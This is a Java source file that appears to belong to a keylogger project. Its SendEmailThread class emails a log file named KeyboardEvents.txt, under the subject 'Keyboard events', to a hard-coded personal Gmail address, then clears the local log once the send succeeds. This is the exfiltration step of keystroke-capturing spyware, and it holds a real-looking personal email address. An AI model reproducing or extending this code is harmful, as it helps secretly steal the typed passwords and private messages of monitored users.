package logs;

public class SendEmailThread implements Runnable{

    private FileLogWriter writer;

    public SendEmailThread(FileLogWriter writer){
        this.writer = writer;
    }

    @Override
    public void run() {
        String res = SendEmail.send("bsuir.dmitriy.dronov@gmail.com","Keyboard events", "KeyboardEvents.txt");
        if(res.equals("Done")) writer.flush();
    }
}
